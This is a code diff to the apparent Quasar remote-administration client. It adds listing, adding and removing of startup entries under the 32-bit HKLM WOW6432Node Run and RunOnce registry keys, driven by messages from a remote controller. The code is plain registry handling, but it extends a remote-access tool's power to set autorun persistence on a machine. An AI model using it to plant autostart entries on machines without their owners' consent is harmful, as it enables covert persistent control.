@@ -86,6 +86,28 @@ namespace Quasar.Client.Messages
                         }
                     }
                 }
+                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
+                {
+                    if (key != null)
+                    {
+                        foreach (var item in key.GetKeyValues())
+                        {
+                            startupItems.Add(new Common.Models.StartupItem
+                            { Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineRunX86 });
+                        }
+                    }
+                }
+                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
+                {
+                    if (key != null)
+                    {
+                        foreach (var item in key.GetKeyValues())
+                        {
+                            startupItems.Add(new Common.Models.StartupItem
+                            { Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineRunOnceX86 });
+                        }
+                    }
+                }
                 if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                 {
                     var files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();
@@ -132,6 +154,20 @@ namespace Quasar.Client.Messages
                     case StartupType.CurrentUserRunOnce:
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                             "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", message.StartupItem.Name, message.StartupItem.Path, true))
+                        {
+                            throw new Exception("Could not add value");
+                        }
+                        break;
+                    case StartupType.LocalMachineRunX86:
+                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
+                            "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", message.StartupItem.Name, message.StartupItem.Path, true))
+                        {
+                            throw new Exception("Could not add value");
+                        }
+                        break;
+                    case StartupType.LocalMachineRunOnceX86:
+                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
+                            "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", message.StartupItem.Name, message.StartupItem.Path, true))
                         {
                             throw new Exception("Could not add value");
                         }
@@ -192,6 +228,20 @@ namespace Quasar.Client.Messages
                     case StartupType.CurrentUserRunOnce:
                         if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                             "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", message.StartupItem.Name))
+                        {
+                            throw new Exception("Could not remove value");
+                        }
+                        break;
+                    case StartupType.LocalMachineRunX86:
+                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
+                            "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", message.StartupItem.Name))
+                        {
+                            throw new Exception("Could not remove value");
+                        }
+                        break;
+                    case StartupType.LocalMachineRunOnceX86:
+                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
+                            "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", message.StartupItem.Name))
                         {
                             throw new Exception("Could not remove value");
                         }
